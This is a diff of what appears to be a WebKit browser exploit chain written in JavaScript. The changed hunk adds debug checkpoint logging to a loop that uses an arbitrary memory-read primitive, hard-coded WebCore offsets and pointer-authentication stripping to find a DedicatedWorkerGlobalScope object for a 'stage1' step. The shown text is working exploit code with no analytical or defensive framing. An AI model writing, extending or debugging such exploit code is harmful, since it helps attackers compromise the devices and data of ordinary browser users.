@@ -18029,22 +18029,32 @@ const device_chipset = {
           resolverCheckpoint(`contexts_lenght:${contexts_length.hex()}`);
           let worker;
 
+          resolverCheckpoint(`context scan begin max_id=${maximum_id.hex()} worker_vtable=${offsets.WebCore__DedicatedWorkerGlobalScope_vtable.hex()}`);
           for (let i = 0n; i < contexts_length; ++i) {
-              const scriptExecutionContext = read64(contexts + 0x30n * i + 0x20n);
+              const context_entry = contexts + 0x30n * i + 0x20n;
+              resolverCheckpoint(`context[${i}] entry=${context_entry.hex()}`);
+              const scriptExecutionContext = read64(context_entry);
+              resolverCheckpoint(`context[${i}] scriptExecutionContext=${scriptExecutionContext.hex()}`);
               if (!scriptExecutionContext)
                   continue;
 
+              resolverCheckpoint(`context[${i}] reading vtable at ${scriptExecutionContext.hex()}`);
               const vtable = read64(scriptExecutionContext);
-              //print(`vtable: ${vtable.noPAC().hex()}    offset:${offsets.WebCore__DedicatedWorkerGlobalScope_vtable.hex()}`);
-              if (vtable.noPAC() != offsets.WebCore__DedicatedWorkerGlobalScope_vtable)
+              const vtableNoPac = vtable.noPAC();
+              resolverCheckpoint(`context[${i}] vtable=${vtable.hex()} nopac=${vtableNoPac.hex()}`);
+              if (vtableNoPac != offsets.WebCore__DedicatedWorkerGlobalScope_vtable)
                   continue;
 
+              resolverCheckpoint(`context[${i}] dedicated worker candidate; reading id`);
               const id = read64(scriptExecutionContext + 0x138n);
+              resolverCheckpoint(`context[${i}] id=${id.hex()}`);
               if (id > maximum_id) {
                   maximum_id = id;
                   worker = scriptExecutionContext;
+                  resolverCheckpoint(`context[${i}] selected worker=${worker.hex()} max_id=${maximum_id.hex()}`);
               }
           }
+          resolverCheckpoint("context scan done");
 
           if (!worker)
               throw new TryAgainError(`stage1 could not find DedicatedWorkerGlobalScope, contexts_length=${contexts_length}`);
